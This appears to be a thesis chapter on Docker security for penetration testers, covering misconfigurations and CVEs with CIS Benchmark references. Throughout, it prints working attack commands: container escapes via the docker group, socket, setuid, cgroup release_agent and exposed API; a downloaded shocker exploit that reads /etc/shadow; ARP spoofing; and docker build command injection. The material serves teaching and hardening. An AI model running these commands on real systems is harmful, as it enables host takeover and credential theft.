\chapter{Known Vulnerabilities in Docker}\label{chapter:vulnerabilities}
Because Docker is such popular software, many security researchers are trying to find and document vulnerabilities. In this chapter we discuss high-impact vulnerabilities that are useful during a penetration test. These are split into misconfigurations (\autoref{section:misconfigurations}) and software bugs (\autoref{section:bugs}).

\medskip

Software bugs and misconfigurations can both be security problems, but they differ in who made the mistake. A \emph{bug} is a problem in a program itself. For example, a buffer overflow is a bug. The problem lies solely in the program itself. To fix it, the code of the program needs to be changed. \emph{Misconfigurations}, on the other hand, are security problems that come from wrong usage of a program. The program is incorrectly configured and that creates a situation that might be exploitable to an attacker. For example, a world-readable file containing passwords is a misconfiguration. To fix a misconfiguration, the user should change the configuration of the program. The developers of the program can only recommend users to configure it correctly.

\medskip

Because there are many security researchers looking for bugs in containerization software, \autoref{section:bugs} will likely become quickly outdated and as such should not be used as an inclusive list of important bugs.

All of the risk of these bugs can be prevented by using the latest version of Docker and Docker images. This is covered by CIS Docker Benchmark guidelines 1.1.2 (Ensure that the version of Docker is up to date) and 5.27 (Ensure that Docker commands always make use of the latest version of their image), respectively.

In the \autoref{chapter:pentesting}, we will look at how these vulnerabilities, bugs and misconfigurations, can be used during a penetration test, but because of the reasons above we will focus more on misconfigurations. In \autoref{chapter:checklist} we will combine the information from this chapter and \autoref{chapter:pentesting} into a checklists of steps.

\section{Misconfigurations}\label{misconfigurations}
In this section, we will take a look at misconfigurations of Docker and the impact those misconfigurations have. For each misconfiguration, we will look at a practical example. We will also look at which guidelines from the Docker CIS Benchmark cover these misconfigurations.

\subsection{Docker Permissions}\label{subsection:docker-permissions}
A common (and notorious) misconfiguration is giving unprivileged users access to Docker, which allows them to create, start and otherwise interact with Docker containers (through the Docker daemon). This is dangerous because this allows the unprivileged users to access all files as \lstinline{root}. The Docker documentation says\footnote{\url{https://docs.docker.com/engine/security/security/}}:
\begin{quote}
\emph{First of all, only trusted users should be allowed to control your Docker daemon. This is a direct consequence of some powerful Docker features. Specifically, Docker allows you to share a directory between the Docker host and a guest container; and it allows you to do so without limiting the access rights of the container. This means that you can start a container where the /host directory is the / directory on your host; and the container can alter your host filesystem without any restriction}.
\end{quote}

In short, because the Docker daemon runs as \lstinline{root}, if a user adds a directory as a volume to a container, that file is accessed as \lstinline{root}. There a few ways for unprivileged users to access Docker. In this section we will look at those.

\subsubsection{\texorpdfstring{\lstinline{docker}}{docker} Group}
Every user in the \lstinline{docker} group is allowed to use Docker (see \autoref{background:docker-socket}). This allows access management of Docker usage. Sometimes a system administrator does not want to do proper access management and adds every user to the \lstinline{docker} group, because that allows everything to run smoothly. This misconfiguration, however, allows every user to access every file on the system, as illustrated in \autoref{listing:docker-group}.

\medskip

Let's say we want the password hash of user \lstinline{admin} on a system where we do not have \lstinline{sudo} privileges, but we are a member of the \lstinline{docker} group.

\begin{lstlisting}[caption={Docker \lstinline{group} exploit example.},captionpos=b,label={listing:docker-group}]
(host)$ sudo -v
Sorry, user unpriv may not run sudo on host.
(host)$ groups | grep -o docker
docker
(host)$ docker run -it --rm -v /:/host ubuntu:latest bash
(cont)# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

In \autoref{listing:docker-group} we first check our permissions. We do not have \lstinline{sudo} permissions, but we are a member of the \lstinline{docker} group. This allows us to create a container with \lstinline{/} mounted as volume and access any file as \lstinline{root}. This includes the file with user password hashes (i.e.\ \lstinline{/etc/passwd}).

\medskip

This is covered by the CIS Docker Benchmark guideline 1.2.2 (Ensure only trusted users are allowed to control Docker daemon).

\subsubsection{The World Readable and Writable Docker Socket}
By default, only \lstinline{root} and every user in the \lstinline{docker} group have access to Docker, because they have read and write access to the Docker socket. However, some administrators set the permissions to read and write for all users (i.e. \lstinline{666}), giving all users access to the Docker daemon.

\begin{lstlisting}[caption={All users can use Docker if they have read and write access to the Socket},captionpos=b,label={listing:read-write-socket}]
(host)$ groups | grep -o docker
(host)$ ls -l /var/run/docker.sock
srw-rw-rw- 1 root docker 0 Dec 20 13:16 /var/run/docker.sock
(host)$ docker run -it --rm -v /:/host ubuntu:latest bash
(cont)# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

In \autoref{listing:read-write-socket}, we see that we are not a member of the Docker group, but because every user has read and write access (i.e.\ the read and write permissions are set for \lstinline{other}) we are still able to use Docker.

\subsubsection{\texorpdfstring{\lstinline{setuid}}{setuid} Bit}\label{subsubsection:setuid}
Another way system administrators might skip proper access management is to set the \lstinline{setuid} bit on the \lstinline{docker} binary.

\medskip

The \lstinline{setuid} bit is a permission bit in Unix, that allows users to run binaries as the owner (or group) of the binary instead of themselves.
This is useful in specific cases. For example, users should be able to change their own passwords, but should not be able to read password hashes of other users. That is why the \lstinline{passwd} binary (which is used to change a users password) has the \lstinline{setuid} bit set. A user can change their password, because \lstinline{passwd} is run as \lstinline{root} (the owner of \lstinline{passwd}) and, of course, \lstinline{root} is able to read from and write to the password file. In this case the \lstinline{setuid} bit is not a security issue, because \lstinline{passwd} asks for the user's password itself and will only change specific entries in the password file.

\medskip

If a system is misconfigured by having the \lstinline{setuid} bit set for the \lstinline{docker} binary, a user will be able to execute Docker as \lstinline{root} (the owner of \lstinline{docker} binary). Just like before, we can easily recreate this attack.

\begin{lstlisting}[caption={Docker \lstinline{setuid} exploit example.},captionpos=b, label={listing:setuid}]
(host)$ sudo -v
Sorry, user unpriv may not run sudo on host.
(host)$ groups | grep -o docker
(host)$ ls -halt /usr/bin/docker
-rwsr-xr-x 1 root root 85M okt 18 17:52 /usr/bin/docker
(host)$ docker run -it --rm -v /:/host ubuntu:latest bash
(cont)# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

In \autoref{listing:setuid} we see that we are not a part of the \lstinline{docker} group, but we can still run \lstinline{docker} because the \lstinline{setuid} bit (and the execute bit for all users) is set.

\medskip

This is not covered by the CIS Docker Benchmark guidelines. There are multiple guidelines about correct file and directory permissions, but none cover the binaries.

\subsection{\texorpdfstring{\lstinline{--privileged}}{--privileged} Flag}

Docker has a special privileged mode\cite{Docker-in-Docker-blog}. This mode is enabled if a container is created with the \lstinline{--privileged} flag and it enables access to all host devices and kernel capabilities. This is a very powerful mode and enables some very useful features (e.g\ building Docker images inside a Docker container). But it is also very dangerous as those kernel features allow an attacker inside the container to escape and access the host.

\hfill

A simple example of this, is using a feature in \lstinline{cgroups}\cite{CGroup-Docs}. If a \lstinline{cgroup} does not contain any processes anymore, it is released. It is possible to specify a command that should be run in case that happens (called a \lstinline{release_agent}). It is possible to define such a \lstinline{release_agent} in a privileged docker. If the \lstinline{cgroup} is released, the command is run on the host\cite{TrailOfBits-Docker-Escape}.

\hfill

We can look at a proof of concept of this attack developed by security researcher Felix Wilhelm\cite{Felix-Wilhem-Tweet}.
\begin{lstlisting}[caption={Docker escape using \lstinline{cgroups} (privileged)},captionpos=b]
(host)$ docker run -it --rm --privileged ubuntu:latest bash
(cont)# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
(cont)# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
(cont)# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
(cont)# touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
(cont)# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
\end{lstlisting}

This proof of concept creates a new \lstinline{cgroup}, sets a \lstinline{release_agent} and releases it. In this case the \lstinline{release_agent} runs \lstinline{ps} and writes the output to the root of the container.

\subsection{Capabilities}\label{misconfigurations:subsection:capabilities}
As we saw in \autoref{protection-mechanisms:subsection:capabilities}, in order to perform privileged actions in the Linux kernel, a process needs the relevant \lstinline{capability}. Docker containers are started with minimal capabilities, but it is possible to add extra capabilities at runtime. Giving containers extra capabilities gives the container permission to perform certain actions. Some of these actions allow Docker escapes. We will look at two such capabilities in the following sections.

\medskip

The CIS Docker Benchmark covers all of these problems in one guideline: 5.3 (Ensure that Linux kernel capabilities are restricted within containers).

\subsubsection{\texorpdfstring{\lstinline{CAP_SYS_ADMIN}}{CAP SYS ADMIN}}\label{CAP_SYS_ADMIN}
The Docker escape by Felix Wilhelm~\cite{Felix-Wilhem-Tweet} we used in \autoref{subsection:privileged} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}~\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{CAP_SYS_ADMIN} capability.

\todo[inline]{Geert: Explain using line numbers}
\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_SYS_ADMIN}.},captionpos=b]
(host)$ docker run --rm -it --cap-add=CAP_SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
(cont)# mkdir /tmp/cgrp
(cont)# mount -t cgroup -o rdma cgroup /tmp/cgrp
(cont)# mkdir /tmp/cgrp/x
(cont)# echo 1 > /tmp/cgrp/x/notify_on_release
(cont)# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
(cont)# echo "$host_path/cmd" > /tmp/cgrp/release_agent
(cont)# echo '#!/bin/sh' > /cmd
(cont)# echo "ps aux > $host_path/output" >> /cmd
(cont)# chmod a+x /cmd
(cont)# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
(cont)# cat /output
\end{lstlisting}

Unlike before, instead of relying on \lstinline{--privileged} to give us write access to a \lstinline{cgroup}, we just need to mount our own. This gives us exactly the same scenario as we saw in \autoref{subsection:privileged}. We use a \lstinline{release_agent} to run code on the host. The only difference being that we have to do some manual work ourselves.

\subsubsection{\texorpdfstring{\lstinline{CAP_DAC_READ_SEARCH}}{CAP DAC READ SEARCH}}
Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default capabilities that a containers are given. But this capability allows a process to escape its the container~\cite{Docker-Shocker-Seclists}. A process with \lstinline{CAP_DAC_READ_SEARCH} is able to bruteforce the internal index of files outside of the container. To demonstrate this attack a proof of concept exploit was released~\cite{Docker-Shocker}~\cite{Docker-Shocker-Analysis}. This exploit has been released in 2014, but still works on containers with the \lstinline{CAP_DAC_READ_SEARCH} capability.

\medskip

\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}.},captionpos=b]
(host)$ curl -o /tmp/shocker.c http://stealth.openwall.net/xSports/shocker.c
(host)$ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
(host)$ cc -Wall -std=c99 -O2 shocker.c -static
(host)$ docker run --rm -it --cap-add=CAP_DAC_READ_SEARCH -v /tmp:/tmp busybox sh
(cont)# /tmp/a.out
...
[!] Win! /etc/shadow output follows:
...
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which is no longer created in newer versions of Docker) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (i.e. \lstinline{/etc/shadow}).

\subsection{Docker Engine API}
The Docker Daemon runs a RESTful\footnote{\url{https://restfulapi.net/}} API\footnote{\url{https://docs.docker.com/engine/api/v1.40/}} that is used to communicate with the Docker Daemon. For example, when an user executes a Docker client command, it actually makes a request to the API. By default the API listens on a UNIX socket accessible through \lstinline{/var/run/docker.sock}, but it also possible to make it listen on a port. This makes it possible for anybody in the \lstinline{docker} group (and \lstinline{root}) to make HTTP requests. For example the following commands (to see all containers) produce the same output (albeit in a different format). The first one is a command using the Docker client and the second is a HTTP request (using \lstinline{curl}\footnote{\url{https://curl.haxx.se/}}).
\begin{lstlisting}[caption={Docker client and Socket},captionpos=b]
(host)$ docker ps -a
...
(host)$ curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/json?all=1"
...
\end{lstlisting}

\hfill

In some cases, it might be possible to access the API when it is not possible to access the Docker client, but because API access gives the same exact possibilities as having access to the Docker client, this is very dangerous\cite{The-Dangers-Of-Docker-Sock}.
However, giving containers access to the API (by adding the socket as a volume) is a common practice, because it allows containers to monitor and analyse other containers.

\subsubsection{Container Escapes}
If the \lstinline{/var/run/docker.sock} is added as a volume to a container, the container has access to the API. This means the process in the container has full access to Docker on the host. This can be used to escape, because the container can create another container with arbitrary volumes and commands. It is even possible to create an interactive shell in another container\cite{Escape-Socket-Shell}.

\hfill

Lets say we want to get the password hash of an user called \lstinline{admin} on the host. We are in a container that has access to \lstinline{/var/run/docker.sock}. We use the API to start another Docker container on the host, that has access to the password hash (located in \lstinline{/etc/shadow}). We read the password file, by looking at the logs of the container that we just started.

\begin{lstlisting}
(host)$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
(cont)# curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"ubuntu:latest","Cmd":["cat", "/host/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}' "http://localhost/containers/create?name=escape"
...
(cont)# curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"
(cont)# curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"
...
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
...
(cont)# curl -XDELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"
\end{lstlisting}

\subsubsection{Finding Sensitive information}

When a container has access to \lstinline{/var/run/docker.sock} (i.e. \lstinline{/var/run/docker.sock} is added as volume inside the container), it cannot only start new containers but it can also look at the configuration of existing containers. This configuration might contain sensitive information (e.g. passwords in the environment variables).

\hfill

Lets start a Postgres\footnote{\url{https://www.postgresql.org/}} database inside a Docker. From the documentation of the Postgres Docker image\footnote{\url{https://hub.docker.com/_/postgres}}, we know that we can provide a password using the \lstinline{POSTGRES_PASSWORD} environment variable. If we have access to another container which has access to the Docker API, we can read that password from the environment variable.

\begin{lstlisting}[caption={Example extract secrets using the Docker API},captionpos=b]
(host)$ docker run --name database -e POSTGRES_PASSWORD=thisshouldbesecret -d postgres
...
(host)$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash
(cont)# apt update
...
(cont)# apt install curl jq
...
(cont)# curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/database/json" | jq -r '.Config.Env'
[
  "POSTGRES_PASSWORD=thisshouldbesecret",
  ...
]
\end{lstlisting}

\subsubsection{Remote Access}
It is also possible to make the API listen on a TCP port. Ports 2375 and 2376 are usually used for HTTP and HTTPS communication, respectively. This, however, does bring all the extra complexity of TCP sockets with it. If not configured to only listen on \lstinline{localhost}, this gives every host on the network access to Docker (which might be desirable behavior). If the host is directly accessible by the internet, it gives everybody access to the full capabilities of Docker on the host. An attacker can exploit this by starting malicious containers\cite{Metasploit-Unprotected-TCP-Socket}.

\hfill

A malicious actor misused this feature in May 2019. He used Shodan\footnote{A search engine to search for systems connected to the internet.}\footnote{\url{https://www.shodan.io/}} to find unprotected publicly accessible Docker APIs and start containers that mine Monero\footnote{A cryptocurrency that focuses on privacy.} and find other hosts to infect\cite{zoolu2-bot-1807}\cite{zoolu2-bot-1809}\cite{zoolu2-bot-1853}.

\subsection{Readable Configuration Files}
Because setting up environments with Docker can be quite complex, many Docker users use programs to save all necessary Docker settings to configuration files (e.g. \lstinline{docker-compose}) to remove the need of repeating complex steps and configuration. These configuration files often contain very sensitive information. If the permissions on these files are configured badly, users that should not be able to read the files, might be able to read the files.

Too very common files that contain sensitive information are \lstinline{.docker/config.json} and \lstinline{docker-compose.yaml} files.

\subsubsection{\texorpdfstring{\lstinline{.docker/config.json}}{.docker/config.json}}
When pushing images to a registry, users need to login to the registry to authenticate themselves.
It would be quite annoying to login every time an user wants to push and image. That is why \lstinline{.docker/config.json} caches those credentials. These are stored in base64 encoding in the home directory of the user by default\footnote{\url{https://docs.docker.com/engine/reference/commandline/login/}}. An attacker with access to the file, can push malicious Docker images\cite{Docker-Credentials-Metasploit}.

\subsubsection{\texorpdfstring{\lstinline{docker-compose.yaml}}{docker-compose.yaml}}
\lstinline{docker-compose.yaml} files often contain secrets (e.g.\ passwords and API keys), because all information that should be passed to a container is saved in the \lstinline{docker-compose.yaml} file.

\subsection{ARP Spoofing}\label{subsection:arp-spoofing}
\todo[inline]{Capturing external traffic}
By default all Docker containers are added to the same bridge network. This means they are able to reach each other. By default Docker containers also receive the \lstinline{CAP_NET_RAW} capability, which allows them to create raw packets. This means that by default, containers are able to ARP spoof other containers\footnote{IPv4 forwarding is enabled by default by Docker}\cite{Abusing-Containers}.

\hfill

Let's take a look at how this in a practical example. Let's say we have three containers. One container will ping another container. A third malicious container wants to intercept the \lstinline{ICMP} packets.

We start three Docker containers using the \lstinline{ubuntu:latest} image (which is the same as \lstinline{ubunut:bionic-20191029} at the time of writing). They have the following names IPv4 addresses and MAC addresses:
\begin{itemize}
    \item \lstinline{victim0}: \lstinline{172.17.0.2} and \lstinline{02:42:ac:11:00:02}
    \item \lstinline{victim1}: \lstinline{172.17.0.3} and \lstinline{02:42:ac:11:00:03}
    \item \lstinline{attacker}: \lstinline{172.17.0.4} and \lstinline{02:42:ac:11:00:04}
\end{itemize}

We use \lstinline{vic0}, \lstinline{vic1} and \lstinline{atck} instead of \lstinline{cont} to indicate in which container a command is executed.

\begin{lstlisting}[caption={Docker container ARP spoof},captionpos=b]
(host)$ docker run --rm -it --name=victim0 --hostname=victim0 ubuntu:latest /bin/bash
(vic0)# apt update
...
(vic0)# apt install net-tools iproute2 iputils-ping
...
(host)$ docker run --rm -it --name=victim1 --hostname=victim1 ubuntu:latest /bin/bash
(host)$ docker run --rm -it --name=attacker --hostname=attacker ubuntu:latest /bin/bash
(atck)# apt update
...
(atck)# apt install dsniff net-tools iproute2 tcpdump
...
(atck)# arpspoof -i eth0 -t 172.17.0.2 172.17.0.3
...
(vic0)# arp
arp
172.17.0.3 ether 02:42:ac:11:00:04 C eth0
...
172.17.0.4 ether 02:42:ac:11:00:04 C eth0
(vic0)# ping 172.17.0.3
...
(atck)# tcpdump -vni eth0 icmp
...
10:16:18.368351 IP (tos 0x0, ttl 63, id 52174, offset 0, flags [DF], proto ICMP (1), length 84)
    172.17.0.2 > 172.17.0.3: ICMP echo request, id 898, seq 5, length 64
10:16:18.368415 IP (tos 0x0, ttl 64, id 8188, offset 0, flags [none], proto ICMP (1), length 84)
    172.17.0.3 > 172.17.0.2: ICMP echo reply, id 898, seq 5, length 64
...
\end{lstlisting}

We first start three containers and install dependencies. We then start to poison the ARP table of \lstinline{victim0}. We can observe this by looking at the ARP table of \lstinline{victim0} (with the \lstinline{arp} command). We see that the entries for \lstinline{172.17.0.3} and \lstinline{172.17.0.4} are the same (\lstinline{02:42:ac:11:00:04}). If we then start pinging \lstinline{victim1} from \lstinline{victim0} and looking at the \lstinline{ICMP} traffic on \lstinline{attacker}, we see that the \lstinline{ICMP} packets are routed through \lstinline{attacker}.

\hfill

Disabling inter-container communication by default is covered in the Docker CIS Benchmark by guideline 2.1 (Ensure network traffic is restricted between containers on the default bridge).

\subsection{\texorpdfstring{\lstinline{iptables}}{iptables} Bypass}\label{subsection:iptables}
The Linux kernel has a built-in firewall, called \lstinline{Netfilter} which can be configured with a program called \lstinline{iptables}. This firewall consists of multiple chains of rules which are stored in tables. Each table has a different purpose. For example, there is a \lstinline{nat} table for address translation and a \lstinline{filter} table for traffic filtering (which is the default).
Each table has chains of ordered rules which also have a different purpose. For example, there are the \lstinline{OUTPUT} and \lstinline{INPUT} chains in the \lstinline{filter} table that are meant for all outgoing and incoming traffic, respectively.
It is possible to configure these rules using a program called \lstinline{iptables}. All Linux based firewalls (e.g. \lstinline{ufw}) use \lstinline{iptables} as their backend.

\hfill

When the Docker daemon is started, it sets up its own chains and rules to create isolated networks. The way it sets up its rules completely bypasses other in the firewall (because they are setup before the other rules) and by default the rules are quite permissive. This is by design, because the network stack of the host and the container are separate, including the firewall rules. It is, however, a bit counterintuitive, because we would assume that if a firewall rule is set on the host, it would apply to everything running on that host (including containers).

\hfill

We will look at the following simple example of bypassing a firewall rule with Docker.

\begin{lstlisting}[caption={Bypass \lstinline{iptables} firewall rules using Docker.},captionpos=b,label={listing:iptables-bypass}]
(host)# iptables -A OUTPUT -p tcp --dport 80 -j DROP
(host)# iptables -A FORWARD -p tcp --dport 80 -j DROP
(host)$ curl http://httpbin.org/get
curl: (7) Failed to connect to httpbin.org port 80: Connection timed out
(host)$ docker run -it --rm ubuntu /bin/bash
(cont)# apt update
...
(cont)# apt install curl
...
(cont)# curl http://httpbin.org/get
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.58.0"
  },
...
  "url": "https://httpbin.org/get"
}
\end{lstlisting}

In \autoref{listing:iptables-bypass} we first setup rules to drop all outgoing (including forwarded) traffic on port \lstinline{80} (the standard \lstinline{HTTP} port). Then, we try to request a webpage on the host. As expected, it does not work. If we then try to make the exact same request in a container, it works.

\hfill

The Docker CIS Benchmark does not cover this problem. It, however, does have guidelines that ensures this problem exists. Guideline 2.3 (Ensure Docker is allowed to make changes to iptables) recommends that the Docker daemon is allowed to change the firewall rules. Guideline 5.9 (Ensure that the host's network \lstinline{namespace} is not shared) recommends to not use the \lstinline{--network=host} argument, to make sure the container is put into a separate network stack. These are a good recommendations, because following them removes the need to configure a containerized network stack ourselves. However, it also isolates the firewall rules of the host from the containers.


\section{Security Related Software Bugs}\label{section:bugs}
\todo[inline]{Link vulnerabilities to scenarios}
\todo[inline]{Something about where to find the CVSS/likelyhood/impact score of each CVE}
\todo[inline]{In the end not very useful, this section is mostly for completeness}
In this section we will look at security related bugs that have been found in the last few years. Although there have been many vulnerabilities found in the Docker ecosystem, not all of them have a large impact. Others are not fully publicly disclosed. We will look some recent, fully disclosed vulnerabilities that might be of use during a penetration test. In the \hyperref[appendix:CVE-List]{appendix} you can find a list of all other Docker related vulnerabilities I have looked at.

\hfill

Because there are many security researchers looking for bugs in containerization software, this section will likely become quickly outdated after publishing and as such should not be used as an inclusive list of important vulnerabilities.

\hfill

All of the risk of these bugs can be prevented by using the latest version of Docker and Docker images. This is covered by CIS Docker Benchmark guidelines 1.1.2 (Ensure that the version of Docker is up to date) and 5.27 (Ensure that Docker commands always make use of the latest version of their image), respectively.

\subsection*{Common Vulnerabilities and Exposures}
\todo[inline]{Find a better place for this}
The Common Vulnerabilities and Exposures (CVE for short) system is a list of all publicly known security vulnerabilities. Every vulnerability that is found gets a CVE identifier, which looks like CVE--2019--0000. The first number represents the year in which the vulnerability is found. The second number is an arbitrary number that is at least four digits long. The system is maintained by the Mitre Corporation. Organizations that are allowed to give out new CVE identifiers are called CVE Numbering Authorities (CNA for short). It is possible to read and search the full list on Mitre's website\footnote{\url{https://cve.mitre.org/}}, the United State's National Vulnerability Database\footnote{\url{https://nvd.nist.gov/}} and other websites like CVEDetails\footnote{\url{https://www.cvedetails.com/}}.

The severity of a CVE is determined by the Common Vulnerability Scoring System (CVSS for short) score.

\subsection{CVE--2019--16884}
Because of a bug in runC (1.0.0-rc8 and older versions) it was possible to mount \lstinline{/proc} in a container. Because the active AppArmor profile is defined in \lstinline{/proc/self/attr/apparmor/current}, this vulnerability allows a container to completely bypass AppArmor.

\hfill

A proof of concept has been provided at\cite{CVE-2019-16884-Github}. We see that if we create a very simple mock \lstinline{/proc}, the Docker starts without the specified AppArmor profile.
\begin{lstlisting}[caption={Bypass AppArmor by mounting \lstinline{/proc}.},captionpos=b]
(host)$ mkdir -p rootfs/proc/self/{attr,fd}
(host)$ touch rootfs/proc/self/{status,attr/exec}
(host)$ touch rootfs/proc/self/fd/{4,5}
(host)$ cat Dockerfile
FROM busybox
ADD rootfs /

VOLUME /proc
(host)$ docker build -t apparmor-bypass .
(host)$ docker run --rm -it --security-opt "apparmor=docker-default"  apparmor-bypass
# container runs unconfined
\end{lstlisting}

\subsection{CVE--2019--13139}\label{CVE-2019-13139}
Older versions than Docker 18.09.4, had a bug were \lstinline{docker build} incorrectly parsed URLs, which allows code execution~\cite{CVE-2019-13139-STAALDRAAD}. The string supplied to \lstinline{docker build} is split on ``:'' and ``\#'' to parse the Git reference. By supplying a malicious URL, it is possible to achieve code execution.

\medskip

For example, in the following \lstinline{docker build} command, the command ``\lstinline{echo attack}'' is executed.

\begin{lstlisting}[caption={\lstinline{docker build} command execution.},captionpos=b]
(host)$ docker build "git@github.com/meh/meh#--upload-pack=echo attack;#:"
\end{lstlisting}

\lstinline{docker build} executes \lstinline{git fetch} in the background. But with the malicious command \lstinline{git fetch --upload-pack=echo attack; git@github.com/meh/meh} is executed, which in turn executes \lstinline{echo attack}.

\subsection{CVE--2019--5736}\label{CVE-2019-5736}
A serious vulnerability was discovered in runC that allows containers to overwrite the runC binary on the host. Docker before version 18.09.2 is vulnerable. Whenever a Docker container is created or when \lstinline{docker exec} is used, a runC process is run. This runC process bootstraps the container. It creates all the necessary restrictions and then executes the process that needs to run in the container. The researches found that it is possible to make runC execute itself in the container, by telling the container to start \lstinline{/proc/self/exe} which during the bootstrap is symlinked to the runC binary~\cite{CVE-2019-5736-DragonSector}~\cite{CVE-2019-5736-Github}. \lstinline{/proc/self/exe} in the container will point to the runC binary on the host. The \lstinline{root} user in the container is then able to replace the runC host binary using that reference. The next time runC is executed (i.e.\ when a container is created or \lstinline{docker exec} is run), the overwritten binary is run instead. This, of course, is dangerous because it allows a malicious container to execute code on the host.

\subsection{CVE--2019--5021}\label{subsection:CVE-2019-5021}
The Docker image for Alpine Linux (one of the most used base images) had a problem where the password of the \lstinline{root} user in the container is left empty. In Linux it is possible to disable a password and to leave it blank. A disabled password cannot be used, but a blank password equals an empty string. This allows non-\lstinline{root} users to gain \lstinline{root} rights by supplying an empty string.

\hfill

It is still possible to use the vulnerable images (\lstinline{alpine:3.3}, \lstinline{alpine:3.4} and \lstinline{alpine:3.5}).
\begin{lstlisting}[caption={The Docker image of Alpine Linux 3.5 has an empty password.},captionpos=b]
(host)$ docker run -it --rm alpine:3.5 cat /etc/shadow
root:::0:::::
...
(host)$ docker run -it --rm alpine:3.5 sh
(cont)# apk add --no-cache linux-pam shadow
...
(cont)# adduser test
...
(cont)# su test
Password:
(cont)$ su root
(cont)#
\end{lstlisting}

\subsubsection*{Side note about the CVSS score of CVE--2019--5021}

This vulnerability has a CVSS score of 9.8 (and a 10 in CVSS 2)\footnote{\url{https://nvd.nist.gov/vuln/detail/CVE-2019-5021}} out of a maximum score of 10. Such a high CVSS score means that this is considered an extremely high-risk vulnerability. But in actuality, this vulnerability is only risky in very specific cases.

An empty \lstinline{root} password sounds very dangerous, but it really is not that dangerous in an isolated environment (e.g.\ a container) that runs as \lstinline{root} (inside the container) by default. This vulnerability will only be dangerous in very specific cases.

For example, if we create a Docker image based on \lstinline{alpine:3.5} that uses a non-\lstinline{root} user by default. If an attacker finds a way to execute code in the container, this vulnerability will allow them to escalate their privileges from the non-\lstinline{root} user to \lstinline{root}, but the attacker will still need to find a way to escape the container. Being able to execute code as \lstinline{root} will help them with escaping the container, but it does not guarantee it. This example shows that this vulnerability is dangerous, but only in a scenario where it is chained using other vulnerabilities.

\subsection{CVE--2018--15664}
A bug was found in Docker 18.06.1-ce-rc1 that allows processes in containers to read and write files on the host\cite{CVE-2018-15664-Openwall}\cite{CVE-2018-15664-Bugzilla}. There is enough time between the checking if a symlink is linked to a safe path (within the container) and the actual using of the symlink, that the symlink can be pointed to another file in the mean time. This allows a container to start by reading or writing a symlink to a arbitrary non-relevant file in the container, but actually read or write a file on the host.

\subsection{CVE--2018--9862}
Docker did try to interpret values passed to the \lstinline{--user} argument as a username before trying them as a user id\cite{CVE-2018-9862-Github}. This can be misused using the first entry of \lstinline{/etc/passwd}. This allows malicious images be created with users that grant \lstinline{root} rights when used.

\begin{lstlisting}[caption={Overwrite the \lstinline{root} user in a container.},captionpos=b]
(host)$ docker run --rm -ti ... ubuntu bash
(cont)# echo "10:x:0:0:root:/root:/bin/bash" > /etc/passwd
(host)$ docker exec -ti -u 10 hello  bash
(cont)# id
uid=0(10) gid=0(root) groups=0(root)
\end{lstlisting}

\subsection{CVE--2016--3697}

Docker before 1.11.2 did try to interpret values passed to the \lstinline{--user} argument as a username before trying them as a user id\cite{CVE-2016-3697-Github}. This allows malicious images be created with users that grant \lstinline{root} rights when used.
\begin{lstlisting}[caption={Override \lstinline{root} user in container.},captionpos=b]
(host)$ docker run --rm -it --name=test ubuntu:latest /bin/bash
(cont)# echo '31337:x:0:0:root:/root:/bin/bash' >> /etc/passwd
(host)$ sudo docker exec -it --user 31337 test /bin/bash
(cont)# id
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}


